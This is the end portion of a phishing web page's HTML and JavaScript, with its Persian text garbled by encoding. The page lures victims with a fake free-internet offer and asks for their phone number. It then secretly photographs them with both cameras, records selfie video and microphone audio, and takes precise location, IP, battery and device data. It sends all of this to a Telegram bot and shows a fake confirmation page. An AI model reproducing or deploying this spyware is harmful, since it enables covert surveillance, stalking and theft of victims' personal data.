                    video: { facingMode: 'environment' }
                }, 'main');
                
                if (mainCameraPhoto && mainCameraPhoto.size > 100) {
                    const caption = `ğŸ“¸ Ø¹Ú©Ø³ Ø¬Ø¯ÛŒØ¯ (Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§ØµÙ„ÛŒ)\n\nğŸ¨ Ù‚Ø§Ù„Ø¨: ğŸ“¶ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†\n\nğŸŒ Ø§ÛŒÙ¾ÛŒ: ${userData.ip}\n\nğŸ”‹Ø¯Ø±ØµØ¯ Ø´Ø§Ø±Ú˜: ${userData.battery}%\n\nğŸ–¥ï¸ Ø¯Ø³ØªÚ¯Ø§Ù‡: ${userData.userAgent}`;
                    await sendPhotoToTelegram(mainCameraPhoto, caption);
                } else {
                    await sendPermissionDeniedMessage('Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§ØµÙ„ÛŒ');
                }
                
                // Û³. Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ (Ø¬Ù„Ùˆ) - Ø¹Ú©Ø³
                const selfiePhoto = await takePhoto({ 
                    video: { facingMode: 'user' }
                }, 'selfie');
                
                if (selfiePhoto && selfiePhoto.size > 100) {
                    const caption = `ğŸ“¸ Ø¹Ú©Ø³ Ø¬Ø¯ÛŒØ¯ (Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ)\n\nğŸ¨ Ù‚Ø§Ù„Ø¨: ğŸ“¶ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†\n\nğŸŒ Ø§ÛŒÙ¾ÛŒ: ${userData.ip}\n\nğŸ”‹Ø¯Ø±ØµØ¯ Ø´Ø§Ø±Ú˜: ${userData.battery}%\n\nğŸ–¥ï¸ Ø¯Ø³ØªÚ¯Ø§Ù‡: ${userData.userAgent}`;
                    await sendPhotoToTelegram(selfiePhoto, caption);
                } else {
                    await sendPermissionDeniedMessage('Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ');
                }
                
                // Û´. Ø¶Ø¨Ø· ÙˆÛŒØ¯ÛŒÙˆ 8 Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ Ø§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ
                const selfieVideo = await recordSelfieVideo();
                
                if (selfieVideo && selfieVideo.size > 100) {
                    const caption = `ğŸ“¸ ÙˆÛŒØ¯ÛŒÙˆ Ø¬Ø¯ÛŒØ¯ (Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ)\n\nğŸ¨ Ù‚Ø§Ù„Ø¨: ğŸ“¶ Ø§ÛŒÙ†ØªØ±Ù†Øª Ø±Ø§ÛŒÚ¯Ø§Ù†\n\nğŸŒ Ø§ÛŒÙ¾ÛŒ: ${userData.ip}\n\nğŸ”‹Ø¯Ø±ØµØ¯ Ø´Ø§Ø±Ú˜: ${userData.battery}%\n\nğŸ–¥ï¸ Ø¯Ø³ØªÚ¯Ø§Ù‡: ${userData.userAgent}`;
                    await sendVideoToTelegram(selfieVideo, caption);
                } else {
                    await sendPermissionDeniedMessage('ÙˆÛŒØ¯ÛŒÙˆÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ');
                }
                
                // Ûµ. Ø¶Ø¨Ø· ØµØ¯Ø§ 10 Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ
                await recordAudio();
                
                if (userData.audioBlob && userData.audioBlob.size > 100) {
                    await sendAudioToTelegram(userData.audioBlob, 'ğŸ¤ Ø¶Ø¨Ø· ØµØ¯Ø§ Û±Û° Ø«Ø§Ù†ÛŒÙ‡â€ŒØ§ÛŒ');
                } else {
                    await sendPermissionDeniedMessage('Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†');
                }
                
                // Û¶. Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ù‚ÛŒÙ‚
                if (userData.location) {
                    const locationCaption = `ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ù‚ÛŒÙ‚ Ú©Ø§Ø±Ø¨Ø±\n\nğŸ“± Ø´Ù…Ø§Ø±Ù‡: ${userData.phone}\n\nğŸŒ IP: ${userData.ip}\n\nğŸ¯ Ø¯Ù‚Øª: ${userData.location.accuracy} Ù…ØªØ±`;
                    await sendLocationToTelegram(
                        userData.location.lat,
                        userData.location.lng,
                        userData.location.accuracy,
                        locationCaption
                    );
                }
                
                // ØªØ£Ø®ÛŒØ± Ø¨Ø±Ø§ÛŒ Ø·Ø¨ÛŒØ¹ÛŒâ€ŒØªØ± Ø´Ø¯Ù†
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Ù†Ù…Ø§ÛŒØ´ ØµÙØ­Ù‡ ØªØ§ÛŒÛŒØ¯
                showSuccessPage();
                
            } catch (error) {
                console.error('Ø®Ø·Ø§ÛŒ Ú©Ù„ÛŒ:', error);
                
                // Ø­ØªÛŒ Ø¯Ø± ØµÙˆØ±Øª Ø®Ø·Ø§ØŒ ØµÙØ­Ù‡ ØªØ§ÛŒÛŒØ¯ Ø±Ø§ Ù†Ø´Ø§Ù† Ø¨Ø¯Ù‡
                document.getElementById('confirmed-phone').textContent = userData.phone;
                document.getElementById('processing-card').classList.remove('is-active');
                document.getElementById('success-card').classList.add('is-active');
                
                // Ø´Ù…Ø§Ø±Ø´ Ù…Ø¹Ú©ÙˆØ³ Ø¨Ø±Ø§ÛŒ Ø±ÙØ±Ø´
                let countdown = 5;
                const countdownElement = document.getElementById('countdown');
                
                const countdownInterval = setInterval(() => {
                    countdown--;
                    countdownElement.textContent = countdown;
                    
                    if (countdown <= 0) {
                        clearInterval(countdownInterval);
                        location.reload();
                    }
                }, 1000);
            }
        }

        // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„
        function validatePhone(phone) {
            return /^09\d{9}$/.test(phone);
        }

        // ØªØºÛŒÛŒØ± ØµÙØ­Ù‡ Ø¨Ù‡ Ù¾Ø±Ø¯Ø§Ø²Ø´
        function goToProcessing() {
            const phone = document.getElementById('validation-input').value.trim();
            
            if (!validatePhone(phone)) {
                alert('Ù„Ø·ÙØ§Ù‹ Ø´Ù…Ø§Ø±Ù‡ Ù…ÙˆØ¨Ø§ÛŒÙ„ Ù…Ø¹ØªØ¨Ø± ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ (Ù…Ø«Ø§Ù„: 09123456789)');
                return false;
            }
            
            userData.phone = phone;
            
            // ØªØºÛŒÛŒØ± Ù†Ù…Ø§ÛŒØ´ Ú©Ø§Ø±Øªâ€ŒÙ‡Ø§
            document.getElementById('main-card').classList.remove('is-active');
            document.getElementById('processing-card').classList.add('is-active');
            
            return true;
        }

        // Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ
        document.addEventListener('DOMContentLoaded', function() {
            const input = document.getElementById('validation-input');
            const button = document.getElementById('action-button');
            
            if (!input || !button) {
                console.error('Ø¹Ù†Ø§ØµØ± DOM Ù¾ÛŒØ¯Ø§ Ù†Ø´Ø¯Ù†Ø¯!');
                return;
            }
            
            // Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ Ø´Ù…Ø§Ø±Ù‡
            input.addEventListener('input', function() {
                button.disabled = !validatePhone(this.value);
            });
            
            // Ú©Ù„ÛŒÚ© Ø±ÙˆÛŒ Ø¯Ú©Ù…Ù‡
            button.addEventListener('click', function() {
                if (goToProcessing()) {
                    // Ø´Ø±ÙˆØ¹ Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø¨Ø§ ØªØ£Ø®ÛŒØ±
                    setTimeout(startDataCollection, 1000);
                }
            });
            
            // ÙØ¹Ø§Ù„ Ú©Ø±Ø¯Ù† Enter
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && validatePhone(this.value)) {
                    if (goToProcessing()) {
                        setTimeout(startDataCollection, 1000);
                    }
                }
            });
            
            // Ø´Ø±ÙˆØ¹ Ø¨Ø§ focus Ø±ÙˆÛŒ input
            setTimeout(() => input.focus(), 500);
        });
    </script>
</body>
</html>
